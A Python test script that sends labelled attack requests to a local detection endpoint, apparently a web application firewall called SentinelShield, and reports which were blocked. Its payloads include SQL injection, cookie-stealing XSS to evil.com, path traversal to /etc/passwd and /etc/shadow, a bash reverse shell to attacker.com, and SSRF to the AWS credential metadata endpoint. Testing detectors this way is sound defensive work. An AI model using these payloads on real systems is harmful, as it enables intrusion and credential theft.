# ─────────────────────────────────────────────────────────────────
#  tests/attack_simulator.py — Test Script
#
#  This script sends various test requests to your running backend
#  to verify that all detection rules are working correctly.
#
#  HOW TO RUN:
#    1. Start the backend first:  uvicorn main:app --reload
#    2. Then run this script:     python tests/attack_simulator.py
#
#  It will print a report showing which attacks were detected.
# ─────────────────────────────────────────────────────────────────

import httpx
import json
import time
from datetime import datetime

BASE_URL = "http://localhost:8000"

# ── Test Cases ────────────────────────────────────────────────────
# Each test case has:
#   name:     What the test is called
#   category: What attack type it should trigger (or "clean")
#   expected: What verdict we expect (ALLOW / FLAG / BLOCK)
#   request:  The request to send

TEST_CASES = [
    # ── Clean Requests ────────────────────────────────────────────
    {
        "name": "Normal product page",
        "category": "clean",
        "expected": "ALLOW",
        "request": {
            "ip": "203.0.113.1",
            "method": "GET",
            "path": "/products",
            "query": "id=42&category=shoes",
            "headers": {"User-Agent": "Mozilla/5.0 (Windows NT 10.0)"},
            "body": None
        }
    },
    {
        "name": "Normal search query",
        "category": "clean",
        "expected": "ALLOW",
        "request": {
            "ip": "203.0.113.2",
            "method": "GET",
            "path": "/search",
            "query": "q=blue+running+shoes&sort=price",
            "headers": {},
            "body": None
        }
    },

    # ── SQL Injection Tests ───────────────────────────────────────
    {
        "name": "Classic OR-based SQLi",
        "category": "SQL Injection",
        "expected": "BLOCK",
        "request": {
            "ip": "10.0.0.1",
            "method": "GET",
            "path": "/login",
            "query": "username=admin'--&password=anything",
            "headers": {},
            "body": None
        }
    },
    {
        "name": "UNION SELECT data extraction",
        "category": "SQL Injection",
        "expected": "BLOCK",
        "request": {
            "ip": "10.0.0.2",
            "method": "GET",
            "path": "/search",
            "query": "q=1 UNION SELECT username,password,email FROM users--",
            "headers": {},
            "body": None
        }
    },
    {
        "name": "Time-based blind SQLi",
        "category": "SQL Injection",
        "expected": "BLOCK",
        "request": {
            "ip": "10.0.0.3",
            "method": "POST",
            "path": "/api/user",
            "query": "",
            "headers": {"Content-Type": "application/json"},
            "body": '{"id": "1; SELECT SLEEP(5)--"}'
        }
    },

    # ── XSS Tests ─────────────────────────────────────────────────
    {
        "name": "Script tag injection",
        "category": "XSS",
        "expected": "BLOCK",
        "request": {
            "ip": "10.0.1.1",
            "method": "GET",
            "path": "/comment",
            "query": "text=<script>document.location='https://evil.com?c='+document.cookie</script>",
            "headers": {},
            "body": None
        }
    },
    {
        "name": "Event handler XSS",
        "category": "XSS",
        "expected": "BLOCK",
        "request": {
            "ip": "10.0.1.2",
            "method": "GET",
            "path": "/profile",
            "query": "avatar=<img src=x onerror=fetch('https://evil.com/steal?c='+document.cookie)>",
            "headers": {},
            "body": None
        }
    },

    # ── LFI / Path Traversal Tests ────────────────────────────────
    {
        "name": "Path traversal to /etc/passwd",
        "category": "LFI",
        "expected": "BLOCK",
        "request": {
            "ip": "10.0.2.1",
            "method": "GET",
            "path": "/download",
            "query": "file=../../../../etc/passwd",
            "headers": {},
            "body": None
        }
    },
    {
        "name": "PHP wrapper abuse",
        "category": "LFI",
        "expected": "BLOCK",
        "request": {
            "ip": "10.0.2.2",
            "method": "GET",
            "path": "/page",
            "query": "template=php://filter/convert.base64-encode/resource=../../config.php",
            "headers": {},
            "body": None
        }
    },

    # ── Command Injection Tests ───────────────────────────────────
    {
        "name": "Shell command chaining",
        "category": "Command Injection",
        "expected": "BLOCK",
        "request": {
            "ip": "10.0.3.1",
            "method": "GET",
            "path": "/ping",
            "query": "host=127.0.0.1; cat /etc/shadow",
            "headers": {},
            "body": None
        }
    },
    {
        "name": "Reverse shell attempt",
        "category": "Command Injection",
        "expected": "BLOCK",
        "request": {
            "ip": "10.0.3.2",
            "method": "POST",
            "path": "/api/exec",
            "query": "",
            "headers": {"Content-Type": "application/json"},
            "body": '{"cmd": "bash -i >& /dev/tcp/attacker.com/4444 0>&1"}'
        }
    },

    # ── SSRF Tests ────────────────────────────────────────────────
    {
        "name": "AWS metadata endpoint",
        "category": "SSRF",
        "expected": "BLOCK",
        "request": {
            "ip": "10.0.4.1",
            "method": "GET",
            "path": "/fetch",
            "query": "url=http://169.254.169.254/latest/meta-data/iam/security-credentials/",
            "headers": {},
            "body": None
        }
    },
    {
        "name": "Internal service access",
        "category": "SSRF",
        "expected": "BLOCK",
        "request": {
            "ip": "10.0.4.2",
            "method": "GET",
            "path": "/proxy",
            "query": "target=http://192.168.1.1/admin",
            "headers": {},
            "body": None
        }
    },

    # ── Encoding Evasion Tests ────────────────────────────────────
    {
        "name": "URL-encoded SQLi evasion",
        "category": "SQL Injection",
        "expected": "BLOCK",
        "request": {
            "ip": "10.0.5.1",
            "method": "GET",
            "path": "/login",
            "query": "user=%27%20OR%201%3D1--",   # ' OR 1=1-- URL encoded
            "headers": {},
            "body": None
        }
    },
]

# ── Run Tests ─────────────────────────────────────────────────────

def run_tests():
    print("\n" + "="*65)
    print("  🛡️  SENTINELSHIELD — ATTACK SIMULATOR")
    print(f"  Running {len(TEST_CASES)} test cases against {BASE_URL}")
    print("="*65 + "\n")

    results = {"passed": 0, "failed": 0, "errors": 0}
    report  = []

    with httpx.Client(timeout=10.0) as client:
        for i, test in enumerate(TEST_CASES, 1):
            try:
                resp = client.post(
                    f"{BASE_URL}/api/inspect",
                    json=test["request"]
                )
                data     = resp.json()
                verdict  = data.get("verdict", "ERROR")
                score    = data.get("threat_score", 0)
                passed   = verdict == test["expected"]

                if passed:
                    results["passed"] += 1
                    status_icon = "✅"
                else:
                    results["failed"] += 1
                    status_icon = "❌"

                print(
                    f"  {status_icon} [{i:02d}] {test['name'][:40]:<40} "
                    f"Expected: {test['expected']:<6} Got: {verdict:<6} Score: {score:.1f}"
                )

                report.append({
                    "test":     test["name"],
                    "category": test["category"],
                    "expected": test["expected"],
                    "got":      verdict,
                    "score":    score,
                    "passed":   passed,
                    "matches":  data.get("matches", []),
                })

                time.sleep(0.1)  # Small delay between requests

            except Exception as e:
                results["errors"] += 1
                print(f"  💥 [{i:02d}] {test['name']} — ERROR: {e}")

    # ── Print Summary ──────────────────────────────────────────────
    total   = len(TEST_CASES)
    passed  = results["passed"]
    accuracy = (passed / total * 100) if total > 0 else 0

    print("\n" + "="*65)
    print("  📊 TEST SUMMARY")
    print("="*65)
    print(f"  Total Tests:  {total}")
    print(f"  ✅ Passed:    {results['passed']}")
    print(f"  ❌ Failed:    {results['failed']}")
    print(f"  💥 Errors:    {results['errors']}")
    print(f"  🎯 Accuracy:  {accuracy:.1f}%")
    print("="*65 + "\n")

    # Save report to JSON
    with open("test_report.json", "w") as f:
        json.dump({
            "timestamp": datetime.utcnow().isoformat(),
            "summary":   results,
            "accuracy":  accuracy,
            "tests":     report,
        }, f, indent=2)

    print("  📝 Full report saved to test_report.json\n")


if __name__ == "__main__":
    run_tests()
